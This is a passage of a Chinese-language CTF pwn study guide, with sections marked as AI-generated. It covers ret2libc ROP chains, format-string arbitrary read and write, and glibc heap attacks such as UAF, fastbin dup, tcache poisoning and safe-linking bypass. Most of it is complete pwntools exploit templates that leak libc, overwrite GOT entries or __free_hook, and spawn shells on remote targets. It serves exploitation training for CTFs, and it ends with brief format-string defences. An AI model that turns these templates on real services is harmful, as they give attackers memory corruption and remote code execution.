p.sendline(payload)
p.interactive()  # 获得交互式终端
```

**x86 vs x64 参数传递差异**：

| 架构 | 参数传递方式 | 利用差异 |
|------|-------------|---------|
| x86 (32位) | 全部通过栈传递 | 直接在栈上排列参数 |
| x64 (64位) | rdi, rsi, rdx, rcx, r8, r9 | 需要 `pop rdi; ret` gadget 设置参数 |

**32 位 Ret2Libc Payload（更简单）**：

```python
payload = flat(
    b'A' * offset,
    system_addr,       # 调用 system
    b'BBBB',           # system 的返回地址（随意）
    binsh_addr          # system 的第一个参数（在栈上）
)
```

### 完整利用脚本模板

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
p = remote('host', port)

# 阶段1：泄露 puts 地址
offset = 72  # 根据分析确定

payload1 = flat(
    b'A' * offset,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)
p.sendline(payload1)
p.recvuntil(b'\n')
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"puts @ {hex(leaked)}")

# 计算 libc 基址
libc.address = leaked - libc.symbols['puts']
log.info(f"libc base @ {hex(libc.address)}")

# 阶段2：Ret2Libc
pop_rdi = libc.address + 0x26b72  # pop rdi; ret gadget
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

# 检查栈对齐（x64 需要 16 字节对齐）
# 如果 system 内部 movaps 指令崩溃，加一个 ret 对齐
ret = pop_rdi + 1  # ret gadget

payload2 = flat(
    b'A' * offset,
    ret,           # 栈对齐
    pop_rdi,       # pop rdi; ret
    binsh,         # /bin/sh 地址
    system         # system("/bin/sh")
)
p.sendline(payload2)
p.interactive()
```

### 常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| `system()` 执行后崩溃 | x64 栈未 16 字节对齐 | 在 `pop rdi; ret` 前加一个 `ret` |
| 泄露地址为 0 | puts 输出包含换行被截断 | 用 `recv` 而非 `recvline`，或正确处理 |
| libc 版本不匹配 | 远程 libc 与本地不同 | 通过 LibcSearcher 或 `pwnlib.libcdb` 查询 |
| 开了 canary | 栈溢出被金丝雀检测 | 需要先泄露 canary 值 |

### Ret2Libc 变体

- **ret2onegadget**：使用 one_gadget 工具找到 libc 中直接获得终端的单个 gadget，无需传参
  ```bash
  one_gadget libc.so.6
  # 输出若干可直接 getshell 的地址及约束条件
  ```
- **ret2csu**：利用 `__libc_csu_init` 中的通用 gadget 链设置多个寄存器参数
- **ret2memcpy**：NX 开启但栈上可写时，用 memcpy 配合 ROP 链构造

> AI生成

---

---

## PWN - 格式化字符串漏洞

> 补充日期：2026-08-04 | 优先级：高 | 经典 PWN 考点

### 基本概念

格式化字符串漏洞（Format String Vulnerability）是指程序使用 `printf()`、`sprintf()`、`fprintf()` 等格式化函数时，将用户输入直接作为格式化字符串参数，导致攻击者可以读取或写入任意内存地址。

**漏洞代码示例**：

```c
// 漏洞代码
printf(user_input);        // 直接使用用户输入作为格式字符串

// 正确写法
printf("%s", user_input);  // 用户输入仅作为参数
```

### 格式化字符功能

| 格式符 | 功能 | 利用方向 |
|--------|------|---------|
| `%p` | 输出指针（栈上的值） | 泄露栈数据 |
| `%x` | 输出十六进制数 | 泄露栈数据 |
| `%d` | 输出十进制数 | 泄露栈数据 |
| `%s` | 读取指针指向的字符串 | 读取任意地址内容 |
| `%n` | 将已输出字节数写入指针指向的地址 | **写入任意地址** |
| `%hn` | 写入 2 字节 | 16位写入 |
| `%hhn` | 写入 1 字节 | 8位写入 |
| `%ln` / `%lln` | 写入 4/8 字节 | 32/64位写入 |
| `%c` | 输出字符 | 配合 %n 使用 |

### 信息泄露

**1. 泄露栈数据**：

```python
# 输入: %p.%p.%p.%p.%p
# 输出: 0x7fff1234.0x400550.0x0.0x1.0x7fff5678
# 第 N 个 %p 泄露栈上第 N 个参数

# 直接定位输出位置
# 输入: AAAA%p.%p.%p.%p.%p.%p.%p.%p
# 输出: AAAA0x... 0x41414141...
# 当输出中出现 0x41414141 时，说明我们的输入在第 N 个参数位置
```

**2. 精确定位偏移**：

```python
from pwn import *

p = process('./vuln')

# 自动确定偏移
for i in range(1, 20):
    p.sendline(f'%{i}$p'.encode())
    result = p.recvline()
    if b'414141414' in result:
        print(f"偏移: {i}")
        break
```

**3. 泄露 libc 地址**：

```python
# 泄露 __libc_start_main 的返回地址（在栈上）
# 偏移需要根据调试确定
p.sendline(b'%41$p')  # 假设 __libc_start_main_ret 在第41个参数
leaked = int(p.recvline().strip(), 16)
libc_base = leaked - libc.symbols['__libc_start_main_ret']
```

**4. 读取任意地址**：

```python
# 使用 %s 读取指定地址的内容
# 构造: [addr]%N$s
# 其中 addr 是要读取的地址，N 是 addr 在栈上的偏移

addr = p32(0x0804a010)  # 目标地址（32位）
payload = addr + b'%7$s'  # 假设偏移为7
p.sendline(payload)
# 输出 addr 指向的字符串
```

### 任意地址写入

**核心原理**：`%n` 将已输出的字符数写入指定地址。通过控制输出字符数来写入指定值。

**32 位写入**：

```python
# 目标: 在 0x0804a030 写入 0x08048456
# 方法: 用 %c 控制输出字符数 + %n 写入

addr = p32(0x0804a030)       # 目标地址在栈上
value = 0x08048456             # 要写入的值

# 已输出 len(addr) = 4 字节
# 还需输出 (value - 4) 字节
payload = addr + f'%{value - 4}x%7$n'.encode()
p.sendline(payload)
```

**大值分次写入（避免输出过多字符）**：

```python
# 利用 %hn (写2字节) 分两次写入
# 目标: 在 0x0804a030 写入 0x08048456

target = 0x0804a030
low = 0x8456       # 低2字节
high = 0x0804      # 高2字节

payload = p32(target) + p32(target + 2)  # 两个地址 = 8字节
# 先写入 high（值较小），再写入 low
payload += f'%{high - 8}x%7$hn'.encode()
payload += f'%{low - high}x%8$hn'.encode()
```

**64 位写入**：

```python
# 64 位地址包含 \x00，会被字符串截断
# 解决: 将地址放在 payload 末尾

# 利用 $$ 偏移引用栈上后面的数据
# 假设偏移为6，地址放在 payload 偏移6+1的位置

value = 0xdeadbeef
addr = p64(0x601020)  # 8字节

# 构造: 格式部分 + padding + 地址
# 先输出格式化字符串，地址放后面
payload = f'%{value}c%10$n'.encode()
payload = payload.ljust(0x40, b'\x00')  # 对齐到栈上的偏移位置
payload += addr
p.sendline(payload)
```

### pwntools fmtstr 模块

```python
from pwn import *

# 自动构造格式化字符串 payload
# fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
# - offset: 输入在栈上的偏移
# - writes: {addr: value} 字典
# - write_size: 'byte' / 'short' / 'int'

# 32位自动构造
payload = fmtstr_payload(7, {0x0804a030: 0x08048456})
p.sendline(payload)

# 64位自动构造
payload = fmtstr_payload(6, {0x601020: 0x4005e3}, write_size='short')
p.sendline(payload)
```

### 利用场景

| 场景 | 方法 |
|------|------|
| 泄露 canary | `%N$p` 读取栈上的 canary 值 |
| 泄露 libc | `%N$p` 读取栈上的 libc 返回地址 |
| 覆写 GOT 表 | `%n` 将 `printf@GOT` 改为 `system` 地址 |
| 覆写返回地址 | `%n` 直接修改栈上的返回地址 |
| 覆写 flag 变量 | 程序中 if(flag) 判断时，写 1 到 flag 地址 |

### 防御

- 永远不要将用户输入直接作为格式化字符串
- 使用 `printf("%s", input)` 而非 `printf(input)`
- 编译器警告：`-Wformat-security`
- FORTIFY_SOURCE 编译选项

> AI生成

---

---

## PWN 堆利用基础（fastbin attack / tcache / UAF）

### 1. 堆利用前置知识

#### 1.1 glibc 堆管理器版本对应

| glibc 版本 | 主要特性 | CTF 常见考点 |
|-----------|---------|-------------|
| 2.23 及以下 | 无 tcache，fastbin/unsorted bin | fastbin attack, unsorted bin leak |
| 2.26 - 2.28 | 引入 tcache（64个链表） | tcache poisoning, tcache dup |
| 2.29 - 2.31 | tcache 加 key 字段 | 需绕过 tcache key 检查 |
| 2.32 - 2.35 | tcache 加 safe-linking | 需泄露堆地址解密 next 指针 |
| 2.36+ | 进一步加固 | 更依赖 IO_FILE 利用 |

> 查看远程 glibc 版本：`pwn 2.31` / 题目附件通常提供 `libc.so.6`，用 `strings libc.so.6 | grep "GLIBC"` 确认版本。

#### 1.2 堆块结构

```
┌──────────────────────────────┐
│ prev_size (8 bytes)          │ ← 仅在前一个块空闲时有效
├──────────────────────────────┤
│ size (8 bytes) │ flags       │ ← A=0非主线程, M=0非mmap, P=1前一个在使用
├──────────────────────────────┤
│ user data ...                │ ← malloc 返回的指针指向这里
│                              │
├──────────────────────────────┤
│ next chunk header ...        │
└──────────────────────────────┘
```

- **fastbin**：大小 ≤ 0x80（64位），单链表 LIFO，不合并
- **tcache**（glibc≥2.26）：每个大小类有7个槽位，优先于 fastbin/unsorted bin
- **unsorted bin**：释放后不立即分类的堆块，双链表，可泄露 libc 地址（fd/bk 指向 main_arena）
- **smallbin**：大小 0x20~0x3F0，双链表，FIFO

#### 1.3 关键地址泄露方法

```python
from pwn import *

# 方法1: unsorted bin 泄露 libc
# 释放一个 >= 0x90 的块进入 unsorted bin
# 其 fd 指针指向 main_arena+88/96
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak - (0x7f... offset)  # 从 main_arena 偏移推算

# 方法2: fastbin 泄露堆地址
# 释放两个 fastbin 块，后一块的 fd 指向前一块地址
heap_leak = u64(p.recv(6).ljust(8, b'\x00'))

# 方法3: tcache 链泄露堆地址
# tcache 块释放后 next 指向前一个同大小块
```

### 2. Use-After-Free (UAF)

#### 2.1 基本原理

释放堆块后，指针未被置零，仍可读写该区域。如果新分配的堆块覆盖了同一区域，就可通过旧指针控制新数据。

#### 2.2 经典 UAF 利用模式

```python
# 场景: 结构体包含函数指针
# struct note { void (*print)(char*); char content[0x20]; };

# Step 1: 分配并释放
add_note(0, "AAAA")    # malloc(0x28) → ptr0
delete_note(0)          # free(ptr0), 但指针还在

# Step 2: 分配同样大小，覆盖函数指针
add_note(1, p64(system_addr) + b"/bin/sh\x00")  # 复用同一块

# Step 3: 通过旧索引触发函数指针
print_note(0)           # 调用 system("/bin/sh")
```

#### 2.3 fastbin dup（double free）

```python
# glibc < 2.29 的 fastbin 无 key 检查
# 同一个 fastbin 块释放两次 → 环形链表
free(A)   # fastbin: A
free(B)   # fastbin: B -> A
free(A)   # fastbin: A -> B -> A (环!)

# 现在 malloc 三次:
malloc()  # 拿到 A，写入 fake fd = target_addr
malloc()  # 拿到 B
malloc()  # 再次拿到 A，此时 fastbin 链: target_addr
malloc()  # 拿到 target_addr 区域 → 任意地址写
```

### 3. tcache 攻击（glibc 2.26+）

#### 3.1 tcache poisoning

```python
# 适用: glibc 2.26 - 2.28 (无 key 检查)
# 或 2.29-2.31 绕过 key (覆写 key 字段)

free(ptr)         # tcache[idx]: ptr
# UAF 修改 ptr 的 next 指针
edit_freed(ptr, p64(target_addr))   # next → target_addr

malloc()          # 拿到 ptr
malloc()          # 拿到 target_addr → 任意地址写
```

#### 3.2 tcache key 绕过（glibc 2.29+）

```python
# glibc 2.29 在 tcache 块中加了 key 字段（位于 next 之后）
# free 时检查 key == tcache? 如果是则检测链表是否已有此块
# 绕过方法: 修改 key 字段为任意非 tcache 值

# UAF 修改 freed 块
edit_freed(ptr, p64(target_addr) + p64(0))  # 覆写 next + 清零 key
free(ptr)   # key 已改为 0，不等于 tcache → 通过检查
```

#### 3.3 safe-linking 绕过（glibc 2.32+）

```python
# glibc 2.32 引入 safe-linking:
# next 指针存储的是: (ptr >> 12) ^ real_next
# 即 next 被异或加密了

# 绕过: 需要泄露堆地址
# 解密: real_next = encrypted ^ (ptr >> 12)

# 假设已知堆地址 heap_base 和加密后的 next 值 enc_next
def tcache_encrypt(ptr, next_ptr):
    """加密 next 指针"""
    return (ptr >> 12) ^ next_ptr

def tcache_decrypt(ptr, enc_next):
    """解密 next 指针"""
    return (ptr >> 12) ^ enc_next

# 利用流程:
# 1. 泄露堆地址 (tcache 链或 fastbin 链)
# 2. UAF 读取加密的 next 值
# 3. 构造: fake_enc = tcache_encrypt(ptr, target_addr)
# 4. UAF 写入 fake_enc 到 next 字段
# 5. 两次 malloc 拿到 target_addr
```

### 4. 通用堆利用脚本模板

```python
#!/usr/bin/env python3
"""
通用堆题模板 - 支持常见菜单交互
适配: UAF / fastbin dup / tcache poisoning
使用前修改 attach() 调试函数中的偏移
"""
from pwn import *
import sys

context(arch='amd64', os='linux', log_level='debug')

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'local':
        return process('./pwn')
    else:
        return remote('host', port)

p = conn()
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# ====== 菜单交互函数 (按题目修改偏移) ======
def add(size, data=b'A'):
    p.sendlineafter(b'choice:', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'data:', data.ljust(size, b'\x00'))

def delete(idx):
    p.sendlineafter(b'choice:', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'choice:', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'choice:', b'4')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# ====== 利用流程 ======
# --- Step 1: 泄露 libc ---
# 释放一个 >= 0x90 的块进 unsorted bin
add(0x90, b'A' * 8)   # idx 0
add(0x20, b'guard')   # idx 1, 防止与 top chunk 合并
delete(0)
# unsorted bin 块的 fd 指向 main_arena
show(0)
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - (libc.symbols['main_arena'] + 96)
log.info(f'libc base: {hex(libc.address)}')

# --- Step 2: tcache poisoning ---
add(0x20, b'AAAA')    # idx 2
delete(2)              # tcache[0x30]: chunk2
# UAF: 修改 next 指针 → __free_hook
target = libc.symbols['__free_hook']
# 注意: glibc 2.32+ 需要异或加密
edit(2, p64(target))
add(0x20, b'tmp')     # idx 3, 拿到 chunk2
add(0x20, p64(libc.symbols['system']))  # idx 4, 拿到 __free_hook → system

# --- Step 3: 触发 ---
add(0x20, b'/bin/sh\x00')  # idx 5
delete(5)   # free(ptr) → __free_hook(ptr) → system("/bin/sh")

p.interactive()
```

### 5. 堆利用速查表

| glibc 版本 | 无 key (≤2.28) | 有 key (2.29-2.31) | safe-linking (≥2.32) |
|-----------|---------------|-------------------|---------------------|
| double free | 直接连续 free | 改 key 再 free | 改 key + 异或加密 |
| tcache poisoning | 改 next 即可 | 改 next + 清 key | 改 (next ^ (addr>>12)) + 清 key |
| 泄露 libc | unsorted bin fd | 同左 | 同左 |
| 泄露堆地址 | tcache/fastbin next | 同左 | 解密 next 得堆地址 |
| __free_hook | system 地址 | system 地址 | glibc 2.34+ 已移除 |
| 替代(hook移除) | IO_FILE / exit_handler | 同左 | 同左 |

### 6. 常见堆题菜单对应

| 菜单选项 | 典型功能 | 利用机会 |
|---------|---------|---------|
| Add/Create | malloc + 写入 | 控制分配大小/内容 |
| Delete/Remove | free | UAF / double free |
| Show/Print | 读取堆内容 | 泄露 libc / 堆地址 |
| Edit/Update | 修改堆内容 | 修改 freed 块的 fd/next |

---

---

> AI生成